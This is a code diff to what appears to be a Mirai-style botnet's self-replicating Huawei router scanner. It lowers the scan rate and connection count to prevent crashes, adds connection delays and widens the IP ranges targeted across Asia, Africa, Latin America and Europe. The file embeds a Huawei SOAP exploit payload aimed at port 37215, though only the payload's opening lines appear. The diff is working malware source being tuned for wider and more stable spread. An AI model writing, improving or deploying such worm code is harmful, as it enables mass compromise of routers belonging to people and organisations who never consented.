@@ -5,12 +5,14 @@
 
 #ifdef SELFREP
 
-#define HUAWEI_SCANNER_MAX_CONNS 128
-#define HUAWEI_SCANNER_RAW_PPS 160
+/* Reduced scanner settings to prevent crashes */
+#define HUAWEI_SCANNER_MAX_CONNS 32     /* Reduced from 128 */
+#define HUAWEI_SCANNER_RAW_PPS 24       /* Reduced from 160 */
 #define HUAWEI_SCANNER_PORT 37215
+#define HUAWEI_CONNECTION_DELAY 300     /* Milliseconds between connections */
 
 /* Huawei SOAP exploit payload */
-static char *huawei_payload = 
+static char *huawei_payload =
 "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
 "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n"
 "<s:Body>\r\n"
@@ -37,26 +39,30 @@ static void huawei_close(struct huawei_conn *);
 void huawei_scanner_init(void) {
     if (fork() == 0) {
         int i;
-        
+        time_t last_connect = 0;
+
         for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
             conns[i].fd = -1;
             conns[i].state = 0;
         }
-        
+
+        srand(time(NULL));
+
         while (TRUE) {
             fd_set fdset;
             struct timeval tv;
             int maxfd = 0;
-            
+            time_t now = time(NULL);
+
             FD_ZERO(&fdset);
-            
+
             for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                 if (conns[i].fd != -1) {
                     FD_SET(conns[i].fd, &fdset);
                     if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                 }
             }
-            
+
             tv.tv_sec = 1;
             tv.tv_usec = 0;
             
@@ -132,28 +138,47 @@ static ipv4_t get_random_ip_huawei(void) {
         /* Target specific ranges where Huawei devices are common */
         uint8_t first_octet = (addr >> 24) & 0xFF;
 
-        /* Africa, Middle East, Asia, and Latin America ranges */
-        if (first_octet == 157 || first_octet == 197 || first_octet == 41 ||  /* Africa */
-            first_octet == 46 || first_octet == 47 || first_octet == 48 ||    /* Middle East */
-            first_octet == 49 || first_octet == 50 || first_octet == 51 ||    /* Middle East/Asia */
-            first_octet == 58 || first_octet == 59 || first_octet == 60 ||    /* Asia */
-            first_octet == 61 || first_octet == 62 || first_octet == 63 ||    /* Asia/Middle East */
-            first_octet == 103 || first_octet == 104 || first_octet == 105 || /* Asia/Africa */
-            first_octet == 106 || first_octet == 107 || first_octet == 108 || /* Asia/LatAm */
-            first_octet == 109 || first_octet == 110 || first_octet == 111 || /* Asia */
-            first_octet == 175 || first_octet == 176 || first_octet == 177 || /* Asia/LatAm */
-            first_octet == 178 || first_octet == 179 || first_octet == 180 || /* Asia/Middle East */
-            first_octet == 181 || first_octet == 182 || first_octet == 183 || /* Asia */
-            first_octet == 184 || first_octet == 185 || first_octet == 186 || /* LatAm/Middle East */
-            first_octet == 187 || first_octet == 188 || first_octet == 189 || /* LatAm/Asia */
-            first_octet == 190 || first_octet == 191 || first_octet == 192 || /* LatAm */
-            first_octet == 193 || first_octet == 194 || first_octet == 195 || /* Europe/Africa */
-            first_octet == 196 || first_octet == 198 || first_octet == 199 || /* Africa/US */
-            first_octet == 200 || first_octet == 201 || first_octet == 202 || /* LatAm/Asia */
-            first_octet == 203 || first_octet == 210 || first_octet == 211 || /* Asia */
-            first_octet == 212 || first_octet == 213 || first_octet == 217 || /* Europe/Middle East */
-            first_octet == 218 || first_octet == 219 || first_octet == 220 || /* Asia */
-            first_octet == 221 || first_octet == 222 || first_octet == 223) { /* Asia */
+        /* Africa, Middle East, Asia, Latin America, Europe - expanded ranges (descending order) */
+        if (first_octet == 223 || first_octet == 222 || first_octet == 221 ||  /* Asia */
+            first_octet == 220 || first_octet == 219 || first_octet == 218 ||  /* Asia */
+            first_octet == 217 || first_octet == 213 || first_octet == 212 ||  /* Europe/Asia */
+            first_octet == 211 || first_octet == 210 || first_octet == 203 ||  /* Asia */
+            first_octet == 202 || first_octet == 201 || first_octet == 200 ||  /* LatAm/Asia */
+            first_octet == 199 || first_octet == 198 || first_octet == 197 ||  /* US/Africa */
+            first_octet == 196 || first_octet == 195 || first_octet == 194 ||  /* Africa/Europe */
+            first_octet == 193 || first_octet == 192 || first_octet == 191 ||  /* Europe/LatAm */
+            first_octet == 190 || first_octet == 189 || first_octet == 188 ||  /* LatAm/Asia */
+            first_octet == 187 || first_octet == 186 || first_octet == 185 ||  /* Asia */
+            first_octet == 184 || first_octet == 183 || first_octet == 182 ||  /* Asia */
+            first_octet == 181 || first_octet == 180 || first_octet == 179 ||  /* Asia/Middle East */
+            first_octet == 178 || first_octet == 177 || first_octet == 176 ||  /* Asia/LatAm */
+            first_octet == 175 || first_octet == 174 || first_octet == 173 ||  /* Asia/US */
+            first_octet == 172 || first_octet == 171 || first_octet == 170 ||  /* Asia/Africa */
+            first_octet == 169 || first_octet == 168 || first_octet == 167 ||  /* Asia/Africa */
+            first_octet == 166 || first_octet == 165 || first_octet == 164 ||  /* Asia/Africa */
+            first_octet == 163 || first_octet == 162 || first_octet == 161 ||  /* Asia/Africa */
+            first_octet == 160 || first_octet == 159 || first_octet == 158 ||  /* Asia/Africa */
+            first_octet == 157 || first_octet == 156 || first_octet == 155 ||  /* Asia/Africa */
+            first_octet == 154 || first_octet == 153 || first_octet == 125 ||  /* Asia */
+            first_octet == 124 || first_octet == 123 || first_octet == 122 ||  /* Asia */
+            first_octet == 121 || first_octet == 120 || first_octet == 119 ||  /* Asia */
+            first_octet == 118 || first_octet == 117 || first_octet == 116 ||  /* Asia */
+            first_octet == 115 || first_octet == 114 || first_octet == 113 ||  /* Asia */
+            first_octet == 112 || first_octet == 111 || first_octet == 110 ||  /* Asia/Europe */
+            first_octet == 109 || first_octet == 108 || first_octet == 107 ||  /* Asia/LatAm */
+            first_octet == 106 || first_octet == 105 || first_octet == 104 ||  /* Asia/Africa */
+            first_octet == 103 || first_octet == 102 || first_octet == 101 ||  /* Asia/Africa */
+            first_octet == 63 || first_octet == 62 || first_octet == 61 ||     /* Asia/Europe */
+            first_octet == 60 || first_octet == 59 || first_octet == 58 ||     /* Asia */
+            first_octet == 57 || first_octet == 56 || first_octet == 55 ||     /* Europe */
+            first_octet == 54 || first_octet == 53 || first_octet == 52 ||     /* Europe */
+            first_octet == 51 || first_octet == 50 || first_octet == 49 ||     /* Middle East/Europe */
+            first_octet == 48 || first_octet == 47 || first_octet == 46 ||     /* Asia/Middle East */
+            first_octet == 45 || first_octet == 44 || first_octet == 43 ||     /* Africa/Asia */
+            first_octet == 42 || first_octet == 41 || first_octet == 40 ||     /* Asia/Africa */
+            first_octet == 39 || first_octet == 38 || first_octet == 37 ||     /* Asia/Europe */
+            first_octet == 36 || first_octet == 27 || first_octet == 14 ||     /* Asia/Europe */
+            first_octet == 2 || first_octet == 1) { /* Asia-Pacific */
             break;
         }
     }
